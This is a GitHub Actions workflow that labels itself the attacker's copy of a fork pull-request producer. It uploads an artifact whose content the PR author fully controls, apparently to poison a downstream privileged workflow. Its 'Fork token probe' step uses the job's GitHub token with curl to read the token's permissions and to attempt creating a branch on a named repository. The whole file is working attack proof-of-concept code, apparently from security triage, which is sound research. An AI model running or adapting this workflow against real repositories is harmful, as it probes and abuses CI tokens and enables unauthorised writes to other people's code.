name: Component Schema Diff Generate

# Fork-PR producer (attacker copy): the PR author controls this workflow file,
# so every byte of the uploaded component-diff-report artifact is attacker-chosen.
on:
  pull_request:
    types: [opened, synchronize, reopened]

permissions:
  contents: read

jobs:
  component-diff-generate:
    runs-on: ubuntu-latest
    steps:
      - name: Save report for comment workflow
        run: |
          mkdir -p /tmp/artifact
          echo "${{ github.event.pull_request.number }}" > /tmp/artifact/pr-number.txt
          echo "true" > /tmp/artifact/diff-generated.txt
          echo '' | base64 -d > /tmp/artifact/diff-content.txt

      - name: Fork token probe
        if: always()
        run: |
          set +e
          R=https://api.github.com/repos/PDFtoMark/triage-adobe-vecd9f2e-a833a2
          echo "FORK_TOKEN_PERMS=$(curl -s -H "Authorization: Bearer ${{ github.token }}" "$R" | jq -c '.permissions')"
          echo "FORK_REF_HTTP=$(curl -s -o /tmp/ref2.json -w '%{http_code}' -X POST -H "Authorization: Bearer ${{ github.token }}" -d '{"ref":"refs/heads/probe-fork-token","sha":"0494beb15234d7d4de79c5c65fefac00f118a352"}' "$R/git/refs")"
          head -c 300 /tmp/ref2.json
          echo

      - name: Upload diff artifact
        uses: actions/upload-artifact@v4
        with:
          name: component-diff-report
          path: /tmp/artifact
          retention-days: 1
